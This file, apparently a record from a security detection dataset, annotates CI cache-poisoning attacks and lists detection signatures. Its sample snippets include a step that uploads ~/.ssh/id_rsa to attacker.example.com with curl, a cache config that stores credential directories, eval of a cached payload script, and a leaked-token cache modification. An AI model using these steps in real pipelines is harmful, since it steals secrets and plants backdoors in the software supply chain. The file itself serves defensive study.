@@ -1,0 +1,180 @@
+{
+  "package_info": {
+    "package_name": "N/A (CI cache configuration and injected scripts)",
+    "package_manager": "N/A (CI platforms: GitHub Actions, GitLab CI, Bitbucket Pipelines, CircleCI, TravisCI, TeamCity, Jenkins)",
+    "package_versions": "N/A (applies to CI configuration and cache usage patterns, not a specific package version)",
+    "why_malicious": "The malicious behavior arises from insecure CI cache configurations and the injection of malicious scripts or files into shared or inherited CI caches. Attackers exploit these mechanisms to poison caches, leak sensitive information, escalate privileges, or plant persistent backdoors, leading to supply chain compromise."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "ci-cd (build/test job execution)",
+        "file_location": ".github/workflows/ci.yml (or equivalent CI config file)",
+        "required_permissions": [
+          "filesystem",
+          "environment_vars",
+          "network (if exfiltration is attempted)"
+        ]
+      },
+      "code_snippet": "cache:\n  key: $CI_COMMIT_REF_SLUG\n  paths:\n    - .venv/\n    - ~/.aws/\n    - ~/.docker/\n    - ~/.ssh/\n    - .npm/\n    - .gradle/\n",
+      "code_language": "yaml",
+      "code_behavior": "During CI job execution, the cache configuration includes sensitive credential directories (technical_action), causing files from ~/.aws/, ~/.docker/, and ~/.ssh/ to be stored in a shared or inherited cache (data_flow), which can be accessed by unauthorized parties (outcome).",
+      "malice_analysis": {
+        "why_suspicious": "Including sensitive credential directories in cache paths exposes secrets to other jobs or repositories that can access the same cache, creating a risk of unauthorized access or exfiltration.",
+        "violated_expectations": "Normally, cache should only include build artifacts or dependency directories, not private keys or credentials. Caching sensitive directories violates the principle of least privilege and proper secret management.",
+        "similar_legitimate_use": "Caching dependency directories (e.g., .npm/, .gradle/) for build speedup is legitimate, but not credential or secret directories.",
+        "key_indicators": [
+          "Cache paths include ~/.aws/, ~/.docker/, ~/.ssh/",
+          "Cache key not scoped to a single repository or branch, allowing cross-project access"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "ci-cd (pull request job execution)",
+        "file_location": ".github/workflows/ci.yml (or equivalent CI config file)",
+        "required_permissions": [
+          "filesystem",
+          "network"
+        ]
+      },
+      "code_snippet": "steps:\n  - name: Restore cache\n    uses: actions/cache@v2\n    with:\n      path: ~/.ssh/\n      key: ${{ runner.os }}-ssh\n  - name: Exfiltrate SSH key\n    run: |\n      curl -X POST -F 'file=@~/.ssh/id_rsa' https://attacker.example.com/upload",
+      "code_language": "yaml/shell",
+      "code_behavior": "During a CI job triggered by a pull request, the workflow restores the cached ~/.ssh/ directory (technical_action), accesses the private SSH key, and uploads it to an external server via HTTP POST (data_flow), resulting in credential exfiltration (outcome).",
+      "malice_analysis": {
+        "why_suspicious": "Uploading private keys to an external server is a clear sign of malicious intent and data exfiltration.",
+        "violated_expectations": "CI jobs should never exfiltrate secrets; restoring ~/.ssh/ from cache is also highly unusual and dangerous.",
+        "similar_legitimate_use": "None; exfiltrating secrets is never legitimate. Restoring ~/.ssh/ from cache is not a standard practice.",
+        "key_indicators": [
+          "Use of curl or similar tool to POST sensitive files externally",
+          "Restoring sensitive directories such as ~/.ssh/ from cache"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "ci-cd (cache poisoning via build job)",
+        "file_location": ".github/workflows/ci.yml or injected build script",
+        "required_permissions": [
+          "filesystem"
+        ]
+      },
+      "code_snippet": "# Malicious file placed in cache\ncp /malicious/payload.sh ~/.cache/build-tools/payload.sh\n# Later, build job executes payload.sh from cache\neval \"$(cat ~/.cache/build-tools/payload.sh)\"",
+      "code_language": "shell",
+      "code_behavior": "During a build job, a malicious script is injected into the cache (technical_action), which is later restored and executed by subsequent jobs or other repositories (data_flow), leading to arbitrary code execution (outcome).",
+      "malice_analysis": {
+        "why_suspicious": "Injecting and executing scripts from shared cache is a classic supply chain attack vector, enabling arbitrary code execution in victim environments.",
+        "violated_expectations": "Cache should not contain executable scripts that are run automatically. Only non-executable build artifacts or dependencies should be cached.",
+        "similar_legitimate_use": "Restoring build tools from cache is legitimate, but not arbitrary or attacker-controlled scripts.",
+        "key_indicators": [
+          "Copying executable scripts into cache directories",
+          "Evaluating or executing files from cache (e.g., eval on cached script)"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "ci-cd (privilege escalation via token leakage)",
+        "file_location": "CI environment variable or cache object",
+        "required_permissions": [
+          "environment_vars",
+          "network"
+        ]
+      },
+      "code_snippet": "# Tcache token stored in cache or environment\nexport TCACHE_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\ncurl -H \"Authorization: Bearer $TCACHE_TOKEN\" https://ci.example.com/cache/modify",
+      "code_language": "shell",
+      "code_behavior": "During CI job execution, an over-privileged cache token is accessed from the environment or cache (technical_action), and used to make API calls to modify or access cache objects belonging to other projects (data_flow), enabling privilege escalation (outcome).",
+      "malice_analysis": {
+        "why_suspicious": "Accessing and using tokens with excessive privileges to manipulate caches outside the intended scope is a privilege escalation vector and can compromise other projects.",
+        "violated_expectations": "Tokens should be scoped to the current project/repository only. Use of over-privileged tokens violates access control best practices.",
+        "similar_legitimate_use": "Using tokens to access own project cache is legitimate, but not to access or modify caches of other projects.",
+        "key_indicators": [
+          "Presence of high-privilege tokens in cache or environment variables",
+          "API calls to cache endpoints with tokens not scoped to current repository"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_5",
+      "execution_context": {
+        "trigger": "ci-cd (backdoor persistence after repository transfer)",
+        "file_location": "cache object associated with transferred repository",
+        "required_permissions": [
+          "filesystem"
+        ]
+      },
+      "code_snippet": "# Backdoor file in cache\n~/.cache/build-tools/backdoor.sh\n# New owner runs CI job\nbash ~/.cache/build-tools/backdoor.sh",
+      "code_language": "shell",
+      "code_behavior": "After a repository is transferred to a new owner, a backdoor script left in the cache (technical_action) is executed during the new owner's CI job (data_flow), granting attacker persistence and potential access to the new environment (outcome).",
+      "malice_analysis": {
+        "why_suspicious": "Persistence of attacker-controlled code after repository transfer is a supply chain backdoor, enabling continued unauthorized access.",
+        "violated_expectations": "Cache should be cleared or re-scoped on repository ownership change to prevent legacy access.",
+        "similar_legitimate_use": "None; backdoor persistence is never legitimate.",
+        "key_indicators": [
+          "Executable scripts in cache surviving repository transfer",
+          "Execution of such scripts in new owner's CI jobs"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker crafts or modifies CI cache configuration to include sensitive files or malicious scripts.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_3"
+      ],
+      "leads_to": "Sensitive data or malicious code is stored in shared/inherited cache."
+    },
+    {
+      "step": 2,
+      "action": "Victim repository or CI job restores the poisoned or sensitive cache.",
+      "implemented_by": [
+        "snippet_2",
+        "snippet_3",
+        "snippet_5"
+      ],
+      "leads_to": "Victim's CI environment is exposed to malicious code or leaks secrets."
+    },
+    {
+      "step": 3,
+      "action": "Malicious code executes, exfiltrates secrets, or escalates privileges using over-privileged tokens.",
+      "implemented_by": [
+        "snippet_2",
+        "snippet_4"
+      ],
+      "leads_to": "Attacker gains unauthorized access, exfiltrates data, or persists in the supply chain."
+    },
+    {
+      "step": 4,
+      "action": "Backdoor persists in cache even after repository transfer, enabling future compromise.",
+      "implemented_by": [
+        "snippet_5"
+      ],
+      "leads_to": "Attacker maintains access to new owner's environment."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "CI cache configuration including sensitive directories such as ~/.ssh/, ~/.aws/, or ~/.docker/",
+      "Restoration and execution of scripts from cache directories (e.g., eval or bash on cached files)",
+      "CI jobs uploading files from sensitive directories (e.g., ~/.ssh/id_rsa) to external endpoints",
+      "Use of over-privileged tokens to access or modify cache objects outside the current project scope"
+    ],
+    "file_indicators": [
+      "Cache paths including ~/.ssh/, ~/.aws/, ~/.docker/",
+      "Presence of executable scripts (e.g., *.sh) in cache directories",
+      "Cache objects persisting after repository transfer or accessible across multiple repositories"
+    ],
+    "network_indicators": [
+      "CI jobs making outbound HTTP(S) requests to non-canonical or attacker-controlled domains (e.g., attacker.example.com)",
+      "API calls to CI cache endpoints with tokens not scoped to current repository or project"
+    ],
+    "how_to_detect": "Monitor CI configuration files for cache paths that include sensitive directories such as ~/.ssh/, ~/.aws/, or ~/.docker/. Flag workflows that restore and execute scripts from cache directories. Detect CI job steps that upload files from sensitive locations to external servers or non-canonical domains. Audit token scopes and usage in CI environments to ensure they are not over-privileged or used to access caches outside the intended project. Alert on cache objects that persist after repository transfer or are accessible across trust boundaries."
+  }
+}
